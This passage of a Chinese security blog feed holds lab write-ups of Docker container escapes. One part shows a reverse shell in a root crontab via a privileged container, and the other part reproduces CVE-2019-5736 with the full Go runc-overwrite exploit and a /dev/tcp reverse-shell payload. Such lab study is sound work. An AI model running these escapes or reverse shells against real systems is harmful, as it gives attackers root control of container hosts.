class="line-numbers-rows"><span></span></span></code></pre><img src="/2025/01/07/lou-dong-zhi-shi-ku/docker-te-quan-mo-shi-rong-qi-tao-yi/%E6%88%AA%E5%B1%8F2025-01-07%2011.19.08.png" style="zoom:50%;"><img src="/2025/01/07/lou-dong-zhi-shi-ku/docker-te-quan-mo-shi-rong-qi-tao-yi/%E6%88%AA%E5%B1%8F2025-01-07%2011.20.42.png" alt="获取反弹shell失败" style="zoom:40%;"><p>获取反弹shell失败。</p><h3 id="4-6-3-先创建任务脚本再创建任务执行"><a href="#4-6-3-先创建任务脚本再创建任务执行" class="headerlink" title="4.6.3 先创建任务脚本再创建任务执行"></a>4.6.3 先创建任务脚本再创建任务执行</h3><p>将bash反弹命令写入到创建的sh文件里面：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> <span class="token string">"bash -i &gt;&amp; /dev/tcp/192.168.52.5/4444 0&gt;&amp;1"</span> <span class="token operator">&gt;</span>/home/test/hacker.sh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2025/01/07/lou-dong-zhi-shi-ku/docker-te-quan-mo-shi-rong-qi-tao-yi/%E6%88%AA%E5%B1%8F2025-01-07%2011.05.50.png" style="zoom:50%;"><p>设置脚本的权限：</p><img src="/2025/01/07/lou-dong-zhi-shi-ku/docker-te-quan-mo-shi-rong-qi-tao-yi/%E6%88%AA%E5%B1%8F2025-01-07%2011.05.30.png" style="zoom:60%;"><p>在编写计划任务到/hacker/etc/crontab文件中：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> <span class="token string">"* * * * * root bash /hacker.sh"</span> <span class="token operator">&gt;&gt;</span> /hacker/etc/crontab（每分钟执行一次）<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2025/01/07/lou-dong-zhi-shi-ku/docker-te-quan-mo-shi-rong-qi-tao-yi/%E6%88%AA%E5%B1%8F2025-01-07%2011.07.14.png" style="zoom:50%;"><h2 id="4-7-攻击端接收反弹shell"><a href="#4-7-攻击端接收反弹shell" class="headerlink" title="4.7 攻击端接收反弹shell"></a>4.7 攻击端接收反弹shell</h2><p>由于定时任务是每分钟执行一次，所以有可能需要稍微等待一会儿。</p><img src="/2025/01/07/lou-dong-zhi-shi-ku/docker-te-quan-mo-shi-rong-qi-tao-yi/%E6%88%AA%E5%B1%8F2025-01-07%2011.09.39.png" style="zoom:40%;"><img src="/2025/01/07/lou-dong-zhi-shi-ku/docker-te-quan-mo-shi-rong-qi-tao-yi/%E6%88%AA%E5%B1%8F2025-01-07%2011.12.18.png" style="zoom:40%;"><p>攻击端成功获取到root权限的shell。</p>]]></content>
      
      
      <categories>
          
          <category> 漏洞知识库 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞知识库 </tag>
            
            <tag> 容器逃逸 </tag>
            
            <tag> docker容器逃逸 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>docker容器逃逸-CVE-2019-5736</title>
      <link href="/2025/01/03/lou-dong-zhi-shi-ku/docker-rong-qi-tao-yi-cve-2019-5736/"/>
      <url>/2025/01/03/lou-dong-zhi-shi-ku/docker-rong-qi-tao-yi-cve-2019-5736/</url>
      
        <content type="html"><![CDATA[<h1 id="一、漏洞概述"><a href="#一、漏洞概述" class="headerlink" title="一、漏洞概述"></a>一、漏洞概述</h1><h2 id="1-1-简介"><a href="#1-1-简介" class="headerlink" title="1.1 简介"></a>1.1 简介</h2><p>CVE-2019-5736是一个严重的安全漏洞，它影响了包括Docker、containerd、Podman和CRI-O在内的多种容器运行时环境。该漏洞允许恶意容器通过覆盖宿主机上的runc可执行文件，实现从容器到宿主机的逃逸，从而获得宿主机的root权限。攻击者可以利用这一点执行任意代码，对宿主机及其上所有容器构成严重威胁。</p><blockquote><p>Docker Runc是什么？</p><p>Docker Runc 是一个轻量级的命令行工具，用于创建和管理符合 Open Container Initiative (OCI) 标准的容器。它是由 Docker 团队开发，并贡献给了开放容器计划 (OCI)。runc 的主要功能是作为 OCI 容器运行时的参考实现，负责容器的启动、停止、暂停和删除等操作。</p><p>runc 与 Docker 的关系非常密切。Docker 使用 runc 作为其容器运行时，这意味着当你使用 Docker 运行容器时，实际上是通过 Docker 调用 runc 来完成容器的创建和管理。runc 提供了一套命令行工具，供用户和上层容器管理工具（如 Docker、Kubernetes 等）调用，作为容器生态中的基础组件，runc 提供了对容器生命周期的底层管理。</p><p>下图是一张Docker组件架构图，描述了Docker运行容器时所依赖的一些组件，近些年基于组件的Docker容器逃逸漏洞大多发生在shim组件和runc组件上。</p><img src="/2025/01/03/lou-dong-zhi-shi-ku/docker-rong-qi-tao-yi-cve-2019-5736/%E6%88%AA%E5%B1%8F2025-01-07%2009.34.52.png" alt="docker组件架构" style="zoom:29%;"><img src="/2025/01/03/lou-dong-zhi-shi-ku/docker-rong-qi-tao-yi-cve-2019-5736/%E6%88%AA%E5%B1%8F2025-01-07%2009.41.42.png" style="zoom:40%;"></blockquote><h2 id="1-2-影响范围"><a href="#1-2-影响范围" class="headerlink" title="1.2 影响范围"></a>1.2 影响范围</h2><ul><li>Docker Version &lt; 18.09.2</li><li>runC Version &lt;= 1.0-rc6</li></ul><h2 id="1-3-漏洞成因"><a href="#1-3-漏洞成因" class="headerlink" title="1.3 漏洞成因"></a>1.3 漏洞成因</h2><p>该漏洞的成因与Linux的pid命名空间和/proc伪文件系统有关。攻击者可以利用这个漏洞，通过修改容器内的可执行文件，获取宿主机上runc可执行文件的文件句柄，然后进行覆盖操作，将runc替换为可控的恶意文件，最终在宿主机上以root权限执行任意代码。受影响的版本包括Docker 18.09.2之前以及runc版本低于1.0-rc6的系统。</p><h1 id="二、漏洞复现（ubuntu-14-04复现失败）"><a href="#二、漏洞复现（ubuntu-14-04复现失败）" class="headerlink" title="二、漏洞复现（ubuntu 14.04复现失败）"></a>二、漏洞复现（ubuntu 14.04复现失败）</h1><p>做这个漏洞复现的时候记得对虚拟机做快照，方便恢复，因为涉及到runc文件的恶意覆盖会影响到容器的正常启动。</p><h2 id="2-1-实验环境"><a href="#2-1-实验环境" class="headerlink" title="2.1 实验环境"></a>2.1 实验环境</h2><ul><li>ubuntu ：uname -a</li></ul><p>Linux ubuntu 4.4.0-142-generic #168~14.04.1-Ubuntu SMP Sat Jan 19 11:26:28 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux</p><img src="/2025/01/03/lou-dong-zhi-shi-ku/docker-rong-qi-tao-yi-cve-2019-5736/%E6%88%AA%E5%B1%8F2025-01-06%2016.15.48.png" style="zoom:60%;"><ul><li><p>docker：docker -v<br>Docker version 18.06.3-ce, build d7080c1</p></li><li><p>runc版本：1.0-rc5</p></li></ul><blockquote><p>runc版本如何查看？</p><p>1）docker info 查看runc相关的信息</p><img src="/2025/01/03/lou-dong-zhi-shi-ku/docker-rong-qi-tao-yi-cve-2019-5736/%E6%88%AA%E5%B1%8F2025-01-03%2013.53.57.png" style="zoom:50%;"><p>在Docker环境中，<code>runc</code>是一个轻量级的容器运行时，它负责根据Docker镜像创建并运行容器。当你看到<code>runc version</code>显示为一串字符序列时，这实际上是<code>runc</code>的Git commit hash或者构建标签（build tag）。</p><img src="/2025/01/03/lou-dong-zhi-shi-ku/docker-rong-qi-tao-yi-cve-2019-5736/%E6%88%AA%E5%B1%8F2025-01-03%2013.53.09.png" style="zoom:50%;"><p>2）直接运行docker-runc –version</p><img src="/2025/01/03/lou-dong-zhi-shi-ku/docker-rong-qi-tao-yi-cve-2019-5736/%E6%88%AA%E5%B1%8F2025-01-03%2013.58.17.png" style="zoom:50%;"></blockquote><p>docker和runc的版本符合漏洞利用的条件，但是操作系统版本不符合漏洞利用的条件。</p><h2 id="2-2-攻击脚本编译"><a href="#2-2-攻击脚本编译" class="headerlink" title="2.2 攻击脚本编译"></a>2.2 攻击脚本编译</h2><pre class="line-numbers language-go" data-language="go"><code class="language-go">git clone https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>github<span class="token punctuation">.</span>com<span class="token operator">/</span>Frichetten<span class="token operator">/</span>CVE<span class="token operator">-</span><span class="token number">2019</span><span class="token operator">-</span><span class="token number">5736</span><span class="token operator">-</span>PoC<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2025/01/03/lou-dong-zhi-shi-ku/docker-rong-qi-tao-yi-cve-2019-5736/%E6%88%AA%E5%B1%8F2025-01-03%2014.27.52.png" style="zoom:50%;"><p>将脚本中要在目标机上执行的payload修改为反弹shell的命令，IP为攻击机IP，端口为攻击机监听的端口：</p><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">package</span> main<span class="token comment">// Implementation of CVE-2019-5736</span><span class="token comment">// Created with help from @singe, @_cablethief, and @feexd.</span><span class="token comment">// This commit also helped a ton to understand the vuln</span><span class="token comment">// https://github.com/lxc/lxc/commit/6400238d08cdf1ca20d49bafb85f4e224348bf9d</span><span class="token keyword">import</span> <span class="token punctuation">(</span><span class="token string">"fmt"</span><span class="token string">"io/ioutil"</span><span class="token string">"os"</span><span class="token string">"strconv"</span><span class="token string">"strings"</span><span class="token string">"flag"</span><span class="token punctuation">)</span><span class="token keyword">var</span> shellCmd <span class="token builtin">string</span><span class="token keyword">func</span> <span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>flag<span class="token punctuation">.</span><span class="token function">StringVar</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>shellCmd<span class="token punctuation">,</span> <span class="token string">"shell"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">,</span> <span class="token string">"Execute arbitrary commands"</span><span class="token punctuation">)</span>flag<span class="token punctuation">.</span><span class="token function">Parse</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token comment">// This is the line of shell commands that will execute on the host</span><span class="token keyword">var</span> payload <span class="token operator">=</span> <span class="token string">"#!/bin/bash \n"</span> <span class="token operator">+</span> shellCmd<span class="token comment">// First we overwrite /bin/sh with the /proc/self/exe interpreter path</span>fd<span class="token punctuation">,</span> err <span class="token operator">:=</span> os<span class="token punctuation">.</span><span class="token function">Create</span><span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span><span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span><span class="token keyword">return</span><span class="token punctuation">}</span>fmt<span class="token punctuation">.</span><span class="token function">Fprintln</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> <span class="token string">"#!/proc/self/exe"</span><span class="token punctuation">)</span>err <span class="token operator">=</span> fd<span class="token punctuation">.</span><span class="token function">Close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span><span class="token keyword">return</span><span class="token punctuation">}</span>fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token string">"[+] Overwritten /bin/sh successfully"</span><span class="token punctuation">)</span><span class="token comment">// Loop through all processes to find one whose cmdline includes runcinit</span><span class="token comment">// This will be the process created by runc</span><span class="token keyword">var</span> found <span class="token builtin">int</span><span class="token keyword">for</span> found <span class="token operator">==</span> <span class="token number">0</span> <span class="token punctuation">{</span>pids<span class="token punctuation">,</span> err <span class="token operator">:=</span> ioutil<span class="token punctuation">.</span><span class="token function">ReadDir</span><span class="token punctuation">(</span><span class="token string">"/proc"</span><span class="token punctuation">)</span><span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span><span class="token keyword">return</span><span class="token punctuation">}</span><span class="token keyword">for</span> <span class="token boolean">_</span><span class="token punctuation">,</span> f <span class="token operator">:=</span> <span class="token keyword">range</span> pids <span class="token punctuation">{</span>fbytes<span class="token punctuation">,</span> <span class="token boolean">_</span> <span class="token operator">:=</span> ioutil<span class="token punctuation">.</span><span class="token function">ReadFile</span><span class="token punctuation">(</span><span class="token string">"/proc/"</span> <span class="token operator">+</span> f<span class="token punctuation">.</span><span class="token function">Name</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"/cmdline"</span><span class="token punctuation">)</span>fstring <span class="token operator">:=</span> <span class="token function">string</span><span class="token punctuation">(</span>fbytes<span class="token punctuation">)</span><span class="token keyword">if</span> strings<span class="token punctuation">.</span><span class="token function">Contains</span><span class="token punctuation">(</span>fstring<span class="token punctuation">,</span> <span class="token string">"runc"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token string">"[+] Found the PID:"</span><span class="token punctuation">,</span> f<span class="token punctuation">.</span><span class="token function">Name</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>found<span class="token punctuation">,</span> err <span class="token operator">=</span> strconv<span class="token punctuation">.</span><span class="token function">Atoi</span><span class="token punctuation">(</span>f<span class="token punctuation">.</span><span class="token function">Name</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span><span class="token keyword">return</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token comment">// We will use the pid to get a file handle for runc on the host.</span><span class="token keyword">var</span> handleFd <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token keyword">for</span> handleFd <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token punctuation">{</span><span class="token comment">// Note, you do not need to use the O_PATH flag for the exploit to work.</span>handle<span class="token punctuation">,</span> <span class="token boolean">_</span> <span class="token operator">:=</span> os<span class="token punctuation">.</span><span class="token function">OpenFile</span><span class="token punctuation">(</span><span class="token string">"/proc/"</span><span class="token operator">+</span>strconv<span class="token punctuation">.</span><span class="token function">Itoa</span><span class="token punctuation">(</span>found<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"/exe"</span><span class="token punctuation">,</span> os<span class="token punctuation">.</span>O_RDONLY<span class="token punctuation">,</span> <span class="token number">0777</span><span class="token punctuation">)</span><span class="token keyword">if</span> <span class="token function">int</span><span class="token punctuation">(</span>handle<span class="token punctuation">.</span><span class="token function">Fd</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token number">0</span> <span class="token punctuation">{</span>handleFd <span class="token operator">=</span> <span class="token function">int</span><span class="token punctuation">(</span>handle<span class="token punctuation">.</span><span class="token function">Fd</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">}</span>fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token string">"[+] Successfully got the file handle"</span><span class="token punctuation">)</span><span class="token comment">// Now that we have the file handle, lets write to the runc binary and overwrite it</span><span class="token comment">// It will maintain it's executable flag</span><span class="token keyword">for</span> <span class="token punctuation">{</span>writeHandle<span class="token punctuation">,</span> <span class="token boolean">_</span> <span class="token operator">:=</span> os<span class="token punctuation">.</span><span class="token function">OpenFile</span><span class="token punctuation">(</span><span class="token string">"/proc/self/fd/"</span><span class="token operator">+</span>strconv<span class="token punctuation">.</span><span class="token function">Itoa</span><span class="token punctuation">(</span>handleFd<span class="token punctuation">)</span><span class="token punctuation">,</span> os<span class="token punctuation">.</span>O_WRONLY<span class="token operator">|</span>os<span class="token punctuation">.</span>O_TRUNC<span class="token punctuation">,</span> <span class="token number">0700</span><span class="token punctuation">)</span><span class="token keyword">if</span> <span class="token function">int</span><span class="token punctuation">(</span>writeHandle<span class="token punctuation">.</span><span class="token function">Fd</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token number">0</span> <span class="token punctuation">{</span>fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token string">"[+] Successfully got write handle"</span><span class="token punctuation">,</span> writeHandle<span class="token punctuation">)</span>fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token string">"[+] The command executed is"</span> <span class="token operator">+</span> payload<span class="token punctuation">)</span>writeHandle<span class="token punctuation">.</span><span class="token function">Write</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token function">byte</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">return</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/bash \n bash -i &gt;&amp; /dev/tcp/192.168.43.26/3333 0&gt;&amp;1 </span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2025/01/03/lou-dong-zhi-shi-ku/docker-rong-qi-tao-yi-cve-2019-5736/%E6%88%AA%E5%B1%8F2025-01-03%2015.25.12.png" style="zoom:40%;"><p>⚠️：这个地方这样改的话就改错位置了，应该改的是payload参数，这里<code>var shellCmd string</code>是个变量类型的声明。</p><img src="/2025/01/03/lou-dong-zhi-shi-ku/docker-rong-qi-tao-yi-cve-2019-5736/%E6%88%AA%E5%B1%8F2025-01-06%2015.43.44.png" style="zoom:40%;"><p>应该改的是payload的值。执行命令编译生成payload。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token assign-left variable">CGO_ENABLED</span><span class="token operator">=</span><span class="token number">0</span> <span class="token assign-left variable">GOOS</span><span class="token operator">=</span>linux <span class="token assign-left variable">GOARCH</span><span class="token operator">=</span>amd64 go build main.go<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><h4 id="大战bug-「安装go环境」："><a href="#大战bug-「安装go环境」：" class="headerlink" title="大战bug-「安装go环境」："></a>大战bug-「安装go环境」：</h4><p>执行编译命令报错，很显然kali上没有go环境用来编译go脚本。</p><img src="/2025/01/03/lou-dong-zhi-shi-ku/docker-rong-qi-tao-yi-cve-2019-5736/%E6%88%AA%E5%B1%8F2025-01-03%2014.35.58.png" style="zoom:30%;"><p>安装gccgo-go、golang-go时报错</p><img src="/2025/01/03/lou-dong-zhi-shi-ku/docker-rong-qi-tao-yi-cve-2019-5736/%E6%88%AA%E5%B1%8F2025-01-03%2014.37.17.png" alt="截屏2025-01-03 14.37.17" style="zoom:40%;"><p>目测是kali软件源的问题。</p><p>更新kali软件包，发现软件源报错。</p><img src="/2025/01/03/lou-dong-zhi-shi-ku/docker-rong-qi-tao-yi-cve-2019-5736/%E6%88%AA%E5%B1%8F2025-01-03%2014.35.37.png" style="zoom:50%;"><p>应该是很久没有在kali装软件了，源都过期了。</p><p>可以直接打开这个目录 /etc/apt/ 并找到 sources.list 文件。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">vim</span> /etc/apt/sources.list<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>先用 # 把原本的注释掉：</p><img src="/2025/01/03/lou-dong-zhi-shi-ku/docker-rong-qi-tao-yi-cve-2019-5736/%E6%88%AA%E5%B1%8F2025-01-03%2014.40.52.png" style="zoom:50%;"><img src="/2025/01/03/lou-dong-zhi-shi-ku/docker-rong-qi-tao-yi-cve-2019-5736/%E6%88%AA%E5%B1%8F2025-01-03%2014.41.30.png" style="zoom:30%;"><p>之后，在下面添加上新的源：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># aliyun 阿里云</span>deb http://mirrors.aliyun.com/kali kali-rolling main non-free contribdeb-src http://mirrors.aliyun.com/kali kali-rolling main non-free contrib <span class="token comment"># ustc 中科大</span>deb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contribdeb-src http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib<span class="token comment">#deb http://mirrors.ustc.edu.cn/kali-security kali-current/updates main contrib non-free</span><span class="token comment">#deb-src http://mirrors.ustc.edu.cn/kali-security kali-current/updates main contrib non-free&lt;br&gt;&lt;br&gt;# 清华大学&lt;br&gt;deb http://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free&lt;br&gt;deb-src https://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free</span> <span class="token comment"># kali 官方源</span>deb http://http.kali.org/kali kali-rolling main non-free contrib deb-src http://http.kali.org/kali kali-rolling main non-free contrib <span class="token comment"># 默认的直接注释掉</span><span class="token comment">#deb http://security.kali.org/kali-security kali-rolling/updates main contrib non-free</span><span class="token comment">#deb-src http://security.kali.org/kali-security kali-rolling/updates main contrib non-free</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><img src="/2025/01/03/lou-dong-zhi-shi-ku/docker-rong-qi-tao-yi-cve-2019-5736/%E6%88%AA%E5%B1%8F2025-01-06%2016.27.04.png" style="zoom:40%;"><p>kali官方源可以注释掉，然后更新更新源：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">apt-get</span> update<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2025/01/03/lou-dong-zhi-shi-ku/docker-rong-qi-tao-yi-cve-2019-5736/%E6%88%AA%E5%B1%8F2025-01-03%2014.44.48.png" style="zoom:40%;"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Err:1 http://mirrors.aliyun.com/kali kali-rolling InRelease                                              The following signatures were invalid: EXPKEYSIG ED444FF07D8D0BF6 Kali Linux Repository <span class="token operator">&lt;</span>devel@kali.org<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>解决方法： 下载最新key添加到keylist</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">wget</span> <span class="token parameter variable">-q</span> <span class="token parameter variable">-O</span> - https://archive.kali.org/archive-key.asc <span class="token operator">|</span> apt-key <span class="token function">add</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2025/01/03/lou-dong-zhi-shi-ku/docker-rong-qi-tao-yi-cve-2019-5736/%E6%88%AA%E5%B1%8F2025-01-03%2014.47.11.png" style="zoom:50%;"><p>访问不了，估计又被墙了。</p><blockquote><p><code>wget</code> 是一个在命令行下使用的文件下载工具，用于从网络上下载文件。<code>wget</code> 命令的参数可以控制其行为和输出。下面是您提到的参数的解释：</p><ol><li><code>-q</code>：这个选项让 <code>wget</code> 以静默模式运行，即不在终端上显示下载过程中的信息。这包括下载进度、错误消息等。静默模式通常用于脚本中，以避免输出不必要的信息。</li><li><code>-O</code>：这个选项指定输出文件的名称。如果不跟文件名，<code>wget</code> 会将下载的内容输出到标准输出（stdout），这通常与管道（<code>|</code>）一起使用，将输出传递给其他命令或程序。</li><li><code>-</code>：当 <code>-O</code> 后面紧跟一个 <code>-</code> 时，它告诉 <code>wget</code> 将下载的内容输出到标准输出，而不是保存到文件。这与 <code>-O -</code> 一起使用，可以实现将下载的内容直接传递给其他命令或程序，而不是保存到磁盘。</li></ol></blockquote><p>在物理机上下载下来先，然后放在虚拟机中。</p><img src="/2025/01/03/lou-dong-zhi-shi-ku/docker-rong-qi-tao-yi-cve-2019-5736/%E6%88%AA%E5%B1%8F2025-01-03%2014.51.34.png" style="zoom:50%;"><p>然后cat查看，通过管道符交给apt-key add添加。</p><p>然后再次运行<code>apt-get update</code>，源能够更新成功。</p><img src="/2025/01/03/lou-dong-zhi-shi-ku/docker-rong-qi-tao-yi-cve-2019-5736/%E6%88%AA%E5%B1%8F2025-01-03%2014.57.57.png" style="zoom:50%;"></blockquote><p>安装go编译工具：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">apt</span> <span class="token function">install</span> golang<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><h3 id="大战bug-「安装go环境」：-1"><a href="#大战bug-「安装go环境」：-1" class="headerlink" title="大战bug-「安装go环境」："></a>大战bug-「安装go环境」：</h3><p>直接把系统搞崩了可还行。</p><img src="/2025/01/03/lou-dong-zhi-shi-ku/docker-rong-qi-tao-yi-cve-2019-5736/%E6%88%AA%E5%B1%8F2025-01-03%2015.15.40.png" style="zoom:50%;"><p>只能强行关机。关机按钮都没了。</p><img src="/2025/01/03/lou-dong-zhi-shi-ku/docker-rong-qi-tao-yi-cve-2019-5736/%E6%88%AA%E5%B1%8F2025-01-03%2015.18.15.png" style="zoom:50%;"><p>重启之后。</p><img src="/2025/01/03/lou-dong-zhi-shi-ku/docker-rong-qi-tao-yi-cve-2019-5736/%E6%88%AA%E5%B1%8F2025-01-03%2015.21.18.png" style="zoom:50%;"><p>go安装成功。</p></blockquote><p>继续编译：</p><img src="/2025/01/03/lou-dong-zhi-shi-ku/docker-rong-qi-tao-yi-cve-2019-5736/%E6%88%AA%E5%B1%8F2025-01-03%2015.24.40.png" style="zoom:40%;"><p>编译成功。</p><h2 id="2-3-上传到容器中"><a href="#2-3-上传到容器中" class="headerlink" title="2.3 上传到容器中"></a>2.3 上传到容器中</h2><p>目标服务器中运行的容器：</p><img src="/2025/01/03/lou-dong-zhi-shi-ku/docker-rong-qi-tao-yi-cve-2019-5736/%E6%88%AA%E5%B1%8F2025-01-03%2015.27.14.png" style="zoom:50%;"><p>假设已经拿下容器的shell。</p><img src="/2025/01/03/lou-dong-zhi-shi-ku/docker-rong-qi-tao-yi-cve-2019-5736/%E6%88%AA%E5%B1%8F2025-01-03%2015.28.09.png" style="zoom:50%;"><p>上传文件到tmp目录中。</p><img src="/2025/01/03/lou-dong-zhi-shi-ku/docker-rong-qi-tao-yi-cve-2019-5736/%E6%88%AA%E5%B1%8F2025-01-03%2016.55.27.png" style="zoom:50%;"><img src="/2025/01/03/lou-dong-zhi-shi-ku/docker-rong-qi-tao-yi-cve-2019-5736/%E6%88%AA%E5%B1%8F2025-01-03%2016.56.14.png" style="zoom:50%;"><h2 id="2-4-修改权限并执行"><a href="#2-4-修改权限并执行" class="headerlink" title="2.4 修改权限并执行"></a>2.4 修改权限并执行</h2><h3 id="2-4-1-蚁剑虚拟终端尝试执行（失败）"><a href="#2-4-1-蚁剑虚拟终端尝试执行（失败）" class="headerlink" title="2.4.1 蚁剑虚拟终端尝试执行（失败）"></a>2.4.1 蚁剑虚拟终端尝试执行（失败）</h3><img src="/2025/01/03/lou-dong-zhi-shi-ku/docker-rong-qi-tao-yi-cve-2019-5736/%E6%88%AA%E5%B1%8F2025-01-03%2017.00.41.png" style="zoom:70%;"><p>执行main文件权限不够。</p><h3 id="2-4-2-先获取反弹的root-shell"><a href="#2-4-2-先获取反弹的root-shell" class="headerlink" title="2.4.2 先获取反弹的root shell"></a>2.4.2 先获取反弹的root shell</h3><blockquote><p>具体如何获取的root权限的容器shell，可以看本站 《三层网络靶场(WHOAMI)从打点到拿下域控 》这篇文章。</p></blockquote><p>先提权获取root权限的容器shell，然后修改main函数的权限之后执行，提示Overwritten成功。</p><p><img src="/2025/01/03/lou-dong-zhi-shi-ku/docker-rong-qi-tao-yi-cve-2019-5736/%E6%88%AA%E5%B1%8F2025-01-03%2017.09.19.png" alt="截屏2025-01-03 17.09.19"></p><p>左边nc监听反弹的目标主机的shell，右边是获取的容器中的root权限的shell。</p><p>如果左边能够获取到shell，那么就成功从容器中实现了逃逸。</p><img src="/2025/01/03/lou-dong-zhi-shi-ku/docker-rong-qi-tao-yi-cve-2019-5736/%E6%88%AA%E5%B1%8F2025-01-03%2017.13.33.png" alt="手动重启容器" style="zoom:50%;"><p>手动重启容器，并没有获得逃逸成功的shell。</p><blockquote><h3 id="大战bug-「容器启动秒退」："><a href="#大战bug-「容器启动秒退」：" class="headerlink" title="大战bug-「容器启动秒退」："></a>大战bug-「容器启动秒退」：</h3><p>之前手动关闭重启容器，这次执行sudo docker start 8e17发现容器启动不起来了。</p><img src="/2025/01/03/lou-dong-zhi-shi-ku/docker-rong-qi-tao-yi-cve-2019-5736/%E6%88%AA%E5%B1%8F2025-01-03%2017.31.24.png" style="zoom:50%;"><p>秒退。</p><p>查看docker服务状态，发现docker正常运行：</p><img 